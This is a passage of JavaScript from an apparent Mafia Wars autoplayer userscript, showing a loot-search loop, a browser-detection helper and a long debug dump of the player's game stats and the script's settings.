  while ((itemName = lootbag.pop())) {
    DEBUG('Looking for ' + itemName + ' in needed items list. We need ' + items.length + ' item(s).');
    for (var i = 0; i < items.length; i++) {
      if (itemName.indexOf(items[i].trim()) != -1 ) {
        // we found some needed loot
        itemFound = true;
        addToLog('found Icon','<span class="loot">'+ itemName + '</span> is the item we were looking for!');
        removeSavedListItem('itemList', itemName);
        removeJobForItem('jobsToDo', itemName);
        popJob();
      }
    }
  }
}

function debugDumpSettings() {
  // Use showIfUnchecked() to show 0 value as "un-checked", or showIfSelected()
  // to show 0 value as "not selected" (for radio buttons).

  var getJobList = function(listName){
    var multiple_jobs_list = getSavedList(listName);
    var jobNames = [];
    for (var i=0, numJobs=multiple_jobs_list.length; i < numJobs; ++i) {
      jobNames.push(missions[multiple_jobs_list[i]][MISSION_NAME]);
    }
    return jobNames.join(', ');
  };

  var ratioJobs = getJobList('selectMissionMultiple');
  var selectTier = 'None';
  if (GM_getValue('selectTier') != '0.0') {
    selectedTierValue = GM_getValue('selectTier').split('.');
    selectTier = cities[parseInt(selectedTierValue[0])][0] + ' - ' + missionTabs[NY][parseInt(selectedTierValue[1]) - 1];
  }

  if (GM_getValue('language') != 'en') {
    DEBUG('Language is "' + GM_getValue('language') + '".');
    addToLog('warning Icon', 'Unfortunately, only the English version of the game is fully supported. If you experience problems, set your Facebook language to English and try again.');
  }

var BrowserDetect = {
  init: function () {
    this.browser = this.searchString(this.dataBrowser) || "An unknown browser";
    this.version = this.searchVersion(navigator.userAgent)
      || this.searchVersion(navigator.appVersion)
      || "an unknown version";
    this.OS = this.searchString(this.dataOS) || "an unknown OS";
  },
  searchString: function (data) {
    for (var i=0;i<data.length;i++)  {
      var dataString = data[i].string;
      var dataProp = data[i].prop;
      this.versionSearchString = data[i].versionSearch || data[i].identity;
      if (dataString) {
        if (dataString.indexOf(data[i].subString) != -1)
          return data[i].identity;
      }
      else if (dataProp)
        return data[i].identity;
    }
  },
  searchVersion: function (dataString) {
    var index = dataString.indexOf(this.versionSearchString);
    if (index == -1) return;
    return parseFloat(dataString.substring(index+this.versionSearchString.length+1));
  },
  dataBrowser: [
    {
      string: navigator.userAgent,
      subString: "Chrome",
      identity: "Chrome"
    },
    {   string: navigator.userAgent,
      subString: "OmniWeb",
      versionSearch: "OmniWeb/",
      identity: "OmniWeb"
    },
    {
      string: navigator.vendor,
      subString: "Apple",
      identity: "Safari",
      versionSearch: "Version"
    },
    {
      prop: window.opera,
      identity: "Opera"
    },
    {
      string: navigator.vendor,
      subString: "iCab",
      identity: "iCab"
    },
    {
      string: navigator.vendor,
      subString: "KDE",
      identity: "Konqueror"
    },
    {
      string: navigator.userAgent,
      subString: "Firefox",
      identity: "Firefox"
    },
    {
      string: navigator.vendor,
      subString: "Camino",
      identity: "Camino"
    },
    {    // for newer Netscapes (6+)
      string: navigator.userAgent,
      subString: "Netscape",
      identity: "Netscape"
    },
    {
      string: navigator.userAgent,
      subString: "MSIE",
      identity: "Explorer",
      versionSearch: "MSIE"
    },
    {
      string: navigator.userAgent,
      subString: "Gecko",
      identity: "Mozilla",
      versionSearch: "rv"
    },
    {     // for older Netscapes (4-)
      string: navigator.userAgent,
      subString: "Mozilla",
      identity: "Netscape",
      versionSearch: "Mozilla"
    }
  ],
  dataOS : [
    {
      string: navigator.platform,
      subString: "Win",
      identity: "Windows"
    },
    {
      string: navigator.platform,
      subString: "Mac",
      identity: "Mac"
    },
    {
         string: navigator.userAgent,
         subString: "iPhone",
         identity: "iPhone/iPod"
      },
    {
      string: navigator.platform,
      subString: "Linux",
      identity: "Linux"
    }
  ]

};

BrowserDetect.init();

  DEBUG('>  >  >  >  >  BEGIN SETTINGS DUMP  <  <  <  <  <<br>' +
          '------------------ End-User System -------------------<br>' +
        'Browser Name: <strong>' + BrowserDetect.browser + '</strong><br>' +
        'Browser Version: <strong>' + BrowserDetect.version + '</strong><br>' +
        'Operating System: <strong>' + BrowserDetect.OS + '</strong><br>' +
        'New Layout: <strong>' + new_header + '</strong><br>' +
          '------------------ PS MWAP Settings---------------------<br>' +
        'Script Version: <strong>' + SCRIPT.version + '</strong><br>' +
        'Language: <strong>' + GM_getValue('language') + '</strong><br>' +
        'isFlashed: <strong>' + isFlashed + '</strong><br>' +
        'isRunning: <strong>' + running + '</strong><br>' +
        'Player current level: <strong>' + level + '</strong><br>' +
        'Player points to next level: <strong>' + ptsToNextLevel + '</strong><br>' +
        'Player mafia size: <strong>' + mafia + '</strong><br>' +
        'Player attack profile: <strong>' + curAttack + '</strong><br>' +
        'Player defense profile: <strong>' + curDefense + '</strong><br>' +
        'Player attack equip: <strong>' + curAttackEquip + '</strong><br>' +
        'Player defense equip: <strong>' + curDefenseEquip + '</strong><br>' +
        'Player health: <strong>' + health + '/' + maxHealth + '</strong><br>' +
        'Player energy: <strong>' + energy + '/' + maxEnergy + '</strong><br>' +
        'Player stamina: <strong>' + stamina + '/' + maxStamina + '</strong><br>' +
        'Player skill points: <strong>' + stats + '</strong><br>' +
        'Energy pack waiting? <strong>' + energyPack + '</strong><br>' +
        'Current location: <strong>' + cities[city][CITY_NAME] + '</strong><br>' +
        'NY cash: <strong>' + (isUndefined(cities[NY][CITY_CASH]) ? 'unknown' : '$' + makeCommaValue(cities[NY][CITY_CASH])) + '</strong><br>' +
        'Cuba cash: <strong>' + (isUndefined(cities[CUBA][CITY_CASH]) ? 'unknown' : 'C$' + makeCommaValue(cities[CUBA][CITY_CASH])) + '</strong><br>' +
        'Moscow cash: <strong>' + (isUndefined(cities[MOSCOW][CITY_CASH]) ? 'unknown' : 'R$' + makeCommaValue(cities[MOSCOW][CITY_CASH])) + '</strong><br>' +
        'Bangkok cash: <strong>' + (isUndefined(cities[BANGKOK][CITY_CASH]) ? 'unknown' : 'B$' + makeCommaValue(cities[BANGKOK][CITY_CASH])) + '</strong><br>' +
        'Vegas cash: <strong>' + (isUndefined(cities[LV][CITY_CASH]) ? 'unknown' : 'V$' + makeCommaValue(cities[LV][CITY_CASH])) + '</strong><br>' +
        '-------------------General Tab--------------------------<br>' +
        'Enable auto-refresh: <strong>' + showIfUnchecked(GM_getValue('autoClick'))+ '</strong><br>' +
        '&nbsp;&nbsp;-Refresh rate low: <strong>'+ GM_getValue('r1') + '</strong><br>' +
        '&nbsp;&nbsp;-Refresh rate high: <strong>' + GM_getValue('r2') + '</strong><br>' +
        'Enable auto-pause: <strong>' + showIfUnchecked(GM_getValue('autoPause')) + '</strong><br>' +
        '&nbsp;&nbsp;-After level up: <strong>' + showIfSelected(GM_getValue('autoPauseAfter')) + '</strong><br>' +
        '&nbsp;&nbsp;-Before level up: <strong>' + showIfSelected(GM_getValue('autoPauseBefore')) + '</strong><br>' +
        '&nbsp;&nbsp;-Exp to pause at: <strong>'+ GM_getValue('autoPauseExp') + '</strong><br>' +
        'Delay rate low: <strong>'+ GM_getValue('d1') + '</strong><br>' +
        'Delay rate high: <strong>' + GM_getValue('d2') + '</strong><br>' +
        'Idle in City: <strong>' + showIfUnchecked(GM_getValue('idleInCity')) + '</strong><br>' +
        '&nbsp;&nbsp;Selected city: <strong>' + cities[GM_getValue('idleLocation', NY)][CITY_NAME] + '</strong><br>' +
        'Enable auto-Daily Chance: <strong>' + showIfUnchecked(GM_getValue('autoLottoOpt')) + '</strong><br>' +
        'Enable collect Daily Chance bonus: <strong>' + showIfUnchecked(GM_getValue('autoLottoBonus'))  + ' == ' + autoLottoBonusList[GM_getValue('autoLottoBonusItem', 0)] + '</strong><br>' +
        'Spend all: <strong>' + showIfUnchecked(GM_getValue('burnFirst')) + ' == ' + burnModes[GM_getValue('burnOption')] + '</strong><br>' +
        'Perform featured jobs: <strong>' + showIfUnchecked(GM_getValue('featJob')) + '</strong><br>' +
        '&nbsp;&nbsp;Selected job: <strong>' + featJobNames[GM_getValue('featJobIndex', 0)] + '</strong><br>' +
        'Choose Sides: <br>' +
        '&nbsp;&nbsp;Moscow: <strong>' + cities[MOSCOW][CITY_SIDES][GM_getValue('sideMoscow', 0)] + '</strong><br>' +
        '&nbsp;&nbsp;Bangkok: <strong>' + cities[BANGKOK][CITY_SIDES][GM_getValue('sideBangkok', 0)] + '</strong><br>' +
        'Use Secret Stash List: <strong>' + showIfUnchecked(GM_getValue('useSecretStashitems')) + '</strong><br>' +
        '&nbsp;&nbsp;Secret Stash Patterns: <strong>' + GM_getValue('secretStashItems') + '</strong><br>' +
        'Popup Processing: <strong>' + showIfUnchecked(GM_getValue('autoProcessPopups')) + '</strong><br>' +
        'autoDailyTake: <strong>' + showIfUnchecked(GM_getValue('autoDailyTake')) + '</strong><br>' +
        '---------------------Display Tab--------------------<br>' +
        'Enable logging: <strong>' + showIfUnchecked(GM_getValue('autoLog')) + '</strong><br>' +
        '&nbsp;&nbsp;-Logging length: <strong>' + GM_getValue('autoLogLength') + '</strong><br>' +
        'Log player updates: <strong>' + showIfUnchecked(GM_getValue('logPlayerUpdates')) + '</strong><br>' +
        '&nbsp;&nbsp;-Updates length: <strong>' + GM_getValue('logPlayerUpdatesMax') + '</strong><br>' +
        'Enable log filtering: <strong>' + showIfUnchecked(GM_getValue('filterLog')) + '</strong><br>' +
        '&nbsp;&nbsp;Filter mode: <strong>' + GM_getValue('filterOpt') + '</strong><br>' +
        '&nbsp;&nbsp;Filter pass: <strong>' + GM_getValue('filterPass') + '</strong><br>' +
        '&nbsp;&nbsp;Filter fail: <strong>' + GM_getValue('filterFail') + '</strong><br>' +
        'Left-align main frame: <strong>'+ showIfUnchecked(GM_getValue('leftAlign')) + '</strong><br>' +
        'Elevate PS MWAP-Header: <strong>'+ showIfUnchecked(GM_getValue('mastheadOnTop')) + '</strong><br>' +
        'Hide All: <strong>'+ showIfUnchecked(GM_getValue('hideAll')) + '</strong><br>' +
        'Show pulse on the fight page: <strong>' + showIfUnchecked(GM_getValue('showPulse')) + '</strong><br>' +
        'Show level on the hitlist page: <strong>' + showIfUnchecked(GM_getValue('showLevel')) + '</strong><br>' +
        'Set window title to name on Facebook account: <strong>' + showIfUnchecked(GM_getValue('fbwindowtitle')) + '</strong><br>' +
        '---------------------Mafia Tab--------------------<br>' +
        'Automatically asks for job help: <strong>' + showIfUnchecked(GM_getValue('autoAskJobHelp')) + '</strong><br>' +
        'Ask for Moscow help: <strong>' + GM_getValue('selectMoscowTier') + '</strong><br>' +
        'Ask for Bangkok help: <strong>' + GM_getValue('selectBangkokTier') + '</strong><br>' +
        'Ask for Vegas help: <strong>' + GM_getValue('selectVegasTier') + '</strong><br>' +
        'Ask for Italy help: <strong>' + GM_getValue('selectItalyTier') + '</strong><br>' +
        'Minimum experience for job help: <strong>' + GM_getValue('autoAskJobHelpMinExp') + '</strong><br>' +
        'Miscellaneous publishing: <br>' +
        '&nbsp;&nbsp;Global Publishing: <strong>' + showIfUnchecked(GM_getValue('autoGlobalPublishing')) + '</strong><br>' +        '&nbsp;&nbsp;Secret stash: <strong>' + showIfUnchecked(GM_getValue('autoSecretStash')) + '</strong><br>' +
        '&nbsp;&nbsp;Share Coins: <strong>' + showIfUnchecked(GM_getValue('autoShareCoins')) + '</strong><br>' +
        '&nbsp;&nbsp;Secret Stash Frequency: <strong>' + GM_getValue('autoSecretStashFrequency') + '</strong><br>' +
        '&nbsp;&nbsp;Ice bonus: <strong>' + showIfUnchecked(GM_getValue('autoIcePublish')) + '</strong><br>' +
        '&nbsp;&nbsp;Ice bonus Frequency: <strong>' + GM_getValue('autoIcePublishFrequency') + '</strong><br>' +
        '&nbsp;&nbsp;Level-up bonus: <strong>' + showIfUnchecked(GM_getValue('autoLevelPublish')) + '</strong><br>' +
        '&nbsp;&nbsp;Achievement bonus: <strong>' + showIfUnchecked(GM_getValue('autoAchievementPublish')) + '</strong><br>' +
        '&nbsp;&nbsp;Automatically share wishlist: <strong>' + showIfUnchecked(GM_getValue('autoShareWishlist')) + '</strong><br>' +
        '&nbsp;&nbsp;Hour interval for sharing wishlist: <strong>' + GM_getValue('autoShareWishlistTime') + '</strong><br>' +
        'Accept mafia invitations: <strong>'+ showIfUnchecked(GM_getValue('acceptMafiaInvitations')) + '</strong><br>' +
        'Automatically ask for Help on Crew Collections: <strong>'+ showIfUnchecked(GM_getValue('autoAskHelponCC')) + '</strong><br>' +
        'Automatically Help on Jobs: <strong>' + showIfUnchecked(GM_getValue('autoHelp')) + '</strong><br>' +
        'Automatically Help on Wars: <strong>' + showIfUnchecked(GM_getValue('autoWarHelp')) + '</strong><br>' +
        'Automatically Help on Burners: <strong>' + showIfUnchecked(GM_getValue('autoBurnerHelp')) + '</strong><br>' +
        'Automatically Help on Parts: <strong>' + showIfUnchecked(GM_getValue('autoPartsHelp')) + '</strong><br>' +
        'Auto Gift Accept: <strong>' + showIfUnchecked(GM_getValue('autoGiftAccept'))  + '</strong><br>' +
        '&nbsp;&nbsp;Gift Choice: <strong>' + GM_getValue('autoGiftAcceptChoice', 'none')   + '</strong><br>' +
        '&nbsp;&nbsp;Gift Reward: <strong>' + GM_getValue('autoGiftAcceptReward', 'none')   + '</strong><br>' +
        'Message Center : Auto Accept Gifts: <strong>' + showIfUnchecked(GM_getValue('autoAcceptMsgGifts'))  + '</strong><br>' +
        'Message Center : Auto Accept Boosts: <strong>' + showIfUnchecked(GM_getValue('autoAcceptMsgBoosts'))  + '</strong><br>' +
        //'Auto Crime Spree: <strong>' + showIfUnchecked(GM_getValue('autoSafehouse'))  + '</strong><br>' +
        'Auto War: <strong>' + showIfUnchecked(GM_getValue('autoWar'))  + '</strong><br>' +
        '&nbsp;&nbsp;War Mode: <strong>' + warModeChoices[GM_getValue('warMode', 0)]  + '</strong><br>' +
        '&nbsp;&nbsp;Auto War Target List: <strong>' + GM_getValue('autoWarTargetList', 0) + '</strong><br>' +
        '&nbsp;&nbsp;Publish war declaration: <strong>' + showIfUnchecked(GM_getValue('autoWarPublish')) + '</strong><br>' +
        '&nbsp;&nbsp;Publish call for backup: <strong>' + showIfUnchecked(GM_getValue('autoWarResponsePublish')) + '</strong><br>' +
        '&nbsp;&nbsp;Publish reward: <strong>' + showIfUnchecked(GM_getValue('autoWarRewardPublish')) + '</strong><br>' +
        '&nbsp;&nbsp;Publish rally for help: <strong>' + showIfUnchecked(GM_getValue('autoWarRallyPublish')) + '</strong><br>' +
        '-----------------Missions/Help Tab-----------------<br>' +
        '&nbsp;&nbsp;Enable Mafia Missions: <strong>' + showIfUnchecked(GM_getValue('AutoMafiaMission')) + '</strong><br>' +
        '&nbsp;&nbsp;Ask Mission Help: <strong>' + showIfUnchecked(GM_getValue('AskMissionHelp')) + '</strong><br>' +
        '&nbsp;&nbsp;Collect Mission Rewards: <strong>' + showIfUnchecked(GM_getValue('AutoMafiaCollection')) + '</strong><br>' +
        '&nbsp;&nbsp;Do Mafia Missions: <strong>' + showIfUnchecked(GM_getValue('AutoMafiaJob')) + '</strong><br>' +
        '&nbsp;&nbsp;Delete Missions Removed From: <strong>' + showIfUnchecked(GM_getValue('AutoMafiaRemoved')) + '</strong><br>' +
        '&nbsp;&nbsp;CollectMissionsTimer: ' + getHoursTime('colmissionTimer') + '</strong><br>' +
        '&nbsp;&nbsp;CheckedMyMissionsTimer: ' + getHoursTime('checkedmymissionTimer') + '</strong><br>' +
        '-------------------Autostat Tab--------------------<br>' +
        'Enable auto-stat: <strong>' + showIfUnchecked(GM_getValue('autoStat')) + '</strong><br>' +
        'Disable auto-stat: <strong>' + showIfUnchecked(GM_getValue('autoStatDisable')) + '</strong><br>' +
        '&nbsp;&nbsp;-Attack Base: <strong>' + GM_getValue('autoStatAttackBase') + '</strong><br>' +
        '&nbsp;&nbsp;-Defense Base: <strong>' + GM_getValue('autoStatDefenseBase') + '</strong><br>' +
        '&nbsp;&nbsp;-Health Base: <strong>' + GM_getValue('autoStatHealthBase') + '</strong><br>' +
        '&nbsp;&nbsp;-Energy Base: <strong>' + GM_getValue('autoStatEnergyBase') + '</strong><br>' +
        '&nbsp;&nbsp;-Stamina Base: <strong>' + GM_getValue('autoStatStaminaBase') + '</strong><br>' +
        '&nbsp;&nbsp;-Attack Ratio: <strong>' + GM_getValue('autoStatAttackRatio') + '</strong><br>' +
        '&nbsp;&nbsp;-Defense Ratio: <strong>' + GM_getValue('autoStatDefenseRatio') + '</strong><br>' +
        '&nbsp;&nbsp;-Health Ratio: <strong>' + GM_getValue('autoStatHealthRatio') + '</strong><br>' +
        '&nbsp;&nbsp;-Energy Ratio: <strong>' + GM_getValue('autoStatEnergyRatio') + '</strong><br>' +
        '&nbsp;&nbsp;-Stamina Ratio: <strong>' + GM_getValue('autoStatStaminaRatio') + '</strong><br>' +
        '&nbsp;&nbsp;-Attack Mode: <strong>' + GM_getValue('autoStatAttackMode') + '</strong><br>' +
        '&nbsp;&nbsp;-Defense Mode: <strong>' + GM_getValue('autoStatDefenseMode') + '</strong><br>' +
        '&nbsp;&nbsp;-Health Mode: <strong>' + GM_getValue('autoStatHealthMode') + '</strong><br>' +
        '&nbsp;&nbsp;-Energy Mode: <strong>' + GM_getValue('autoStatEnergyMode') + '</strong><br>' +
        '&nbsp;&nbsp;-Stamina Mode: <strong>' + GM_getValue('autoStatStaminaMode') + '</strong><br>' +
        '&nbsp;&nbsp;-Attack Prio: <strong>' + GM_getValue('autoStatAttackPrio') + '</strong><br>' +
        '&nbsp;&nbsp;-Defense Prio: <strong>' + GM_getValue('autoStatDefensePrio') + '</strong><br>' +
        '&nbsp;&nbsp;-Health Prio: <strong>' + GM_getValue('autoStatHealthPrio') + '</strong><br>' +
        '&nbsp;&nbsp;-Energy Prio: <strong>' + GM_getValue('autoStatEnergyPrio') + '</strong><br>' +
        '&nbsp;&nbsp;-Stamina Prio: <strong>' + GM_getValue('autoStatStaminaPrio') + '</strong><br>' +
        '&nbsp;&nbsp;-Attack Fallback: <strong>' + GM_getValue('autoStatAttackFallback') + '</strong><br>' +
        '&nbsp;&nbsp;-Defense Fallback: <strong>' + GM_getValue('autoStatDefenseFallback') + '</strong><br>' +
        '&nbsp;&nbsp;-Health Fallback: <strong>' + GM_getValue('autoStatHealthFallback') + '</strong><br>' +
        '&nbsp;&nbsp;-Energy Fallback: <strong>' + GM_getValue('autoStatEnergyFallback') + '</strong><br>' +
        '&nbsp;&nbsp;-Stamina Fallback: <strong>' + GM_getValue('autoStatStaminaFallback') + '</strong><br>' +
        '&nbsp;&nbsp;-Rest AutoStat: <strong>' + GM_getValue('restAutoStat') + '</strong><br>' +
        '&nbsp;&nbsp;-Next Stat: <strong>' + GM_getValue('nextStat') + '</strong><br>' +
        'autoResetTimers: <strong>' + showIfUnchecked(GM_getValue('autoResetTimers')) + '</strong><br>' +
        'autoEnforcedTitle: <strong>' + GM_getValue('autoEnforcedTitle') + '</strong><br>' +
        '&nbsp;&nbsp;Hour interval for title enforcing: <strong>' + GM_getValue('autoEnforcedTitleTime') + '</strong><br>' +
        '-------------------Energy Tab--------------------<br>' +
        'Enable auto-mission: <strong>' + showIfUnchecked(GM_getValue('autoMission')) + '</strong><br>' +
        '&nbsp;&nbsp;-Repeat Job: <strong>' + showIfUnchecked(GM_getValue('repeatJob')) + '</strong><br>' +
        '&nbsp;&nbsp;-Job selected: <strong>' + missions[GM_getValue('selectMission')][MISSION_NAME] + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;&nbsp;-Jobs: <strong>' + ratioJobs + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;&nbsp;-Mastery Tier: <strong>' + selectTier + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;&nbsp;-Optimize at end level: <strong>' + showIfUnchecked(GM_getValue('endLevelOptimize')) + '</strong><br>' +
        'Enable auto-energy pack: <strong>' + showIfUnchecked(GM_getValue('autoEnergyPack')) + '</strong><br>' +
        'Estimated job ratio: <strong>' + GM_getValue('estimateJobRatio') + '</strong><br>' +
        'Has helicopter: <strong>' + showIfUnchecked(GM_getValue('hasHelicopter')) + '</strong><br>' +
        'Has golden throne: <strong>' + showIfUnchecked(GM_getValue('hasGoldenThrone')) + '</strong><br>' +
        'Is Maniac: <strong>' + showIfUnchecked(GM_getValue('isManiac')) + '</strong><br>' +
        //'Auto send energy pack: <strong>' + showIfUnchecked(GM_getValue('sendEnergyPack')) + '</strong><br>' +
        'Auto ask energy pack: <strong>' + showIfUnchecked(GM_getValue('askEnergyPack')) + '</strong><br>' +
        'Reward for energy pack: <strong>' + showIfUnchecked(GM_getValue('rewardEnergyPack')) + '</strong><br>' +
        'Skip Fighting In Job Tier Mastery: <strong>' + showIfUnchecked(GM_getValue('skipfight')) + '</strong><br>' +
        'Check for mini Energy Packs: <strong>' + showIfUnchecked(GM_getValue('checkMiniPack')) + '</strong><br>' +
        'Energy threshold: <strong>' + GM_getValue('selectEnergyUse') + ' ' + numberSchemes[GM_getValue('selectEnergyUseMode', 0)] + ' (refill to ' + SpendEnergy.ceiling + ')</strong><br>' +
        'Energy reserve: <strong>' + + GM_getValue('selectEnergyKeep') + ' ' + numberSchemes[GM_getValue('selectEnergyKeepMode', 0)] + ' (keep above ' + SpendEnergy.floor + ')</strong><br>' +
        '&nbsp;&nbsp;-Energy use started: <strong>' + GM_getValue('useEnergyStarted') + '</strong><br>' +
        'Mission Energy reserve: <strong>' + + GM_getValue('selectMissionEnergyKeep') + ' ' + numberSchemes[GM_getValue('selectMissionEnergyKeepMode', 0)] + ' (keep above ' + SpendMissionEnergy.floor + ')</strong><br>' +
        'autoEnergyPackForce: <strong>' + showIfUnchecked(GM_getValue('autoEnergyPackForce')) + '</strong><br>' +
        '&nbsp;&nbsp;-autoEnergyPackForcePts: <strong>' + GM_getValue('autoEnergyPackForcePts') + '</strong><br>' +
        '-------------------Stamina Tab-------------------<br>' +
        'Spend stamina: <strong>' + showIfUnchecked(GM_getValue('staminaSpend')) + '</strong><br>' +
        'How: <strong>' + staminaSpendChoices[GM_getValue('staminaSpendHow', 0)] + '</strong><br>' +
        'Fight till Iced then Rob?: <strong>' + showIfUnchecked(GM_getValue('fightrob')) + '</strong><br>' +
        '&nbsp;&nbsp;Skip iced targets: <strong>' + showIfUnchecked(GM_getValue('iceCheck')) + '</strong><br>' +
        '&nbsp;&nbsp;-Fight in: <strong>' + fightLocations[GM_getValue('fightLocation', 0)] + '</strong><br>' +
        '&nbsp;&nbsp;-Reattack <strong>' + showIfUnchecked(GM_getValue('staminaReattack')) + '</strong><br>' +
        '&nbsp;&nbsp;-Reattack threshold:<strong>' + GM_getValue('reattackThreshold') + '</strong><br>' +
        '&nbsp;&nbsp;-Powerattack <strong>' + showIfUnchecked(GM_getValue('staminaPowerattack')) + '</strong><br>' +
        '&nbsp;&nbsp;-Random fight max level: <strong>' + GM_getValue('fightLevelMax') + ' (' + showIfRelative('fightLevelMaxRelative') + ')</strong><br>' +
        '&nbsp;&nbsp;-Random fight max mafia: <strong>' + GM_getValue('fightMafiaMax') + ' (' + showIfRelative('fightMafiaMaxRelative') + ')</strong><br>' +
        '&nbsp;&nbsp;-Random fight min mafia: <strong>' + GM_getValue('fightMafiaMin') + ' (' + showIfRelative('fightMafiaMinRelative') + ')</strong><br>' +
        '&nbsp;&nbsp;-Random fight stealth: <strong>' + showIfUnchecked(GM_getValue('fightStealth')) + '</strong><br>' +
        '&nbsp;&nbsp;-Random fight use Patterns: <strong>' + showIfUnchecked(GM_getValue('fightNames')) + '</strong><br>' +
        '&nbsp;&nbsp;-Random fight avoid names: <strong>' + showIfUnchecked(GM_getValue('fightAvoidNames')) + '</strong><br>' +
        '&nbsp;&nbsp;-Random fight specific names: <strong>' + showIfUnchecked(GM_getValue('fightOnlyNames')) + '</strong><br>' +
        'Families list: <strong>' + GM_getValue('fightClanName') + '</strong><br>' +
        '&nbsp;&nbsp;-List fight opponents: <strong>' + GM_getValue('pfightlist') + '</strong><br>' +
        '&nbsp;&nbsp;-List fight remove stronger: <strong>' + showIfUnchecked(GM_getValue('fightRemoveStronger')) + '</strong><br>' +
        '&nbsp;&nbsp;-Collect hitman bounties in: <strong>' + locations[GM_getValue('hitmanLocation', 0)] + '</strong><br>' +
        '&nbsp;&nbsp;-Hitman min bounty: <strong>' + parseCash(GM_getValue('hitmanBountyMin')) + '</strong><br>' +
        '&nbsp;&nbsp;-Hitman bounty selection: <strong>' + bountySelectionChoices[(GM_getValue('bountySelection'))] + '</strong><br>' +
        '&nbsp;&nbsp;-Hitman use Patterns: <strong>' + showIfUnchecked(GM_getValue('hitmanNames')) + '</strong><br>' +
        '&nbsp;&nbsp;-Hitman avoid names: <strong>' + showIfUnchecked(GM_getValue('hitmanAvoidNames')) + '</strong><br>' +
        '&nbsp;&nbsp;-Hitman specific names: <strong>' + showIfUnchecked(GM_getValue('hitmanOnlyNames')) + '</strong><br>' +
        'Families list: <strong>' + GM_getValue('hitmanClanName') + '</strong><br>' +
        '&nbsp;&nbsp;-Rob in: <strong>' + locations[GM_getValue('robLocation', NY)] + '</strong><br>' +
        '&nbsp;&nbsp;-AutoHit bounty: <strong>' + parseCash(GM_getValue('autoHitListBounty')) + '</strong><br>' +
        '&nbsp;&nbsp;-Set Bounties in: <strong>' + locations[GM_getValue('autoHitListLoc', 0)] + '</strong><br>' +
        '&nbsp;&nbsp;-Random <strong>' + showIfUnchecked(GM_getValue('autoHitListRandom')) + '</strong><br>' +
        '&nbsp;&nbsp;-AutoHit opponents: <strong>' + GM_getValue('pautoHitOpponentList') + '</strong><br>' +
        '&nbsp;&nbsp;-AutoHit background: <strong>' + showIfUnchecked(GM_getValue('bgAutoHitCheck')) + '</strong><br>' +
        '&nbsp;&nbsp;-Random Stam Spend - Fight in: <strong>' + GM_getValue('randomFightLocations') + '</strong><br>' +
        '&nbsp;&nbsp;-Random Stam Spend - Rob in: <strong>' + GM_getValue('randomRobLocations') + '</strong><br>' +
        '&nbsp;&nbsp;-Random Stam Spend - Hit in: <strong>' + GM_getValue('randomHitmanLocations') + '</strong><br>' +
        'Stamina threshold: <strong>' + GM_getValue('selectStaminaUse') + ' ' + numberSchemes[GM_getValue('selectStaminaUseMode', 0)] + ' (refill to ' + SpendStamina.ceiling + ')</strong><br>' +
        '&nbsp;&nbsp;-Stamina use started: <strong>' + GM_getValue('useStaminaStarted') + '</strong><br>' +
        'Stamina Jobs & Fights reserve: <strong>' + + GM_getValue('selectStaminaKeep') + ' ' + numberSchemes[GM_getValue('selectStaminaKeepMode', 0)] + ' (keep above ' + SpendStamina.floor + ')</strong><br>' +
        'Stamina Manual reserve: <strong>' + + GM_getValue('selectMissionStaminaKeep') + ' ' + numberSchemes[GM_getValue('selectMissionStaminaKeepMode', 0)] + ' (Missions will keep above ' + SpendMissionStamina.floor + ')</strong><br>' +
        'Ignore reserve to level-up: <strong>' + showIfUnchecked(GM_getValue('allowStaminaToLevelUp')) + '</strong><br>' +
        '------------------Health Tab-------------------<br>' +
        'Enable auto-heal: <strong>' + showIfUnchecked(GM_getValue('autoHeal')) + '</strong><br>' +
        '&nbsp;&nbsp;-Heal in : <strong>' + locations[GM_getValue('healLocation')] + '</strong><br>' +
        '&nbsp;&nbsp;-Minimum health: <strong>' + GM_getValue('healthLevel') + '</strong><br>' +
        '&nbsp;&nbsp;-Attack at critical health: <strong>' + showIfUnchecked(GM_getValue('attackCritical')) + '</strong><br>' +
        '&nbsp;&nbsp;-Hide in Hospital: <strong>' + showIfUnchecked(GM_getValue('hideInHospital')) + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;-Heal if health is above 19: <strong>' + showIfUnchecked(GM_getValue('forceHealOpt7')) + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;-Heal after 5 minutes: <strong>' + showIfUnchecked(GM_getValue('forceHealOpt5')) + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;-Heal when stamina is full: <strong>' + showIfUnchecked(GM_getValue('forceHealOpt4')) + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;-Heal when stamina can be spent: <strong>' + showIfUnchecked(GM_getValue('forceHealOpt3')) + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;-Minimum Stamina Allowing auto-Heal: <strong>' + GM_getValue('stamina_min_heal') + '</strong><br>' +
        //'&nbsp;&nbsp;&nbsp;block auto-Heal while robbing: <strong>' + GM_getValue('BlockHealRobbing') + '</strong><br>' +
        'Hitlist riding: <strong>' + showIfUnchecked(GM_getValue('hideAttacks')) + '</strong><br>' +
        '&nbsp;&nbsp;Hitlist riding XP limit: <strong>' + GM_getValue('rideHitlistXP') + '</strong><br>' +
        'Stop PA: <strong>' + showIfUnchecked(GM_getValue('stopPA')) + '</strong><br>' +
        '&nbsp;&nbsp;when health falls below: <strong>' + GM_getValue('stopPAHealth') + '</strong><br>' +
        '------------------Cash Tab-------------------<br>' +
        'Collect NY Take: <strong>' + showIfUnchecked(GM_getValue('collectTakeNew York')) + '</strong><br>' +
        '&nbsp;&nbsp;-Next take at NY:' + timeLeftGM('takeHourNew York') + '</strong><br>' +
        '&nbsp;&nbsp;-Next take at Cuba:' + timeLeftGM('takeHourCuba') + '</strong><br>' +
        '&nbsp;&nbsp;-Next take at Moscow:' + timeLeftGM('takeHourMoscow') + '</strong><br>' +
        '&nbsp;&nbsp;-Next take at Bangkok:' + timeLeftGM('takeHourBangkok') + '</strong><br>' +
        '&nbsp;&nbsp;-Next take at LV:' + timeLeftGM('takeHourLas Vegas') + '</strong><br>' +
        '&nbsp;&nbsp;-Next take at Italy:' + timeLeftGM('takeHourItaly') + '</strong><br>' +
        'Build Cars: <strong>' + showIfUnchecked(GM_getValue('buildCar')) + '</strong><br>' +
        '&nbsp;&nbsp;Car Type: <strong>' + cityCars[GM_getValue('buildCarId', 9)][0] + '</strong><br>' +
        'Build Weapons: <strong>' + showIfUnchecked(GM_getValue('buildWeapon')) + '</strong><br>' +
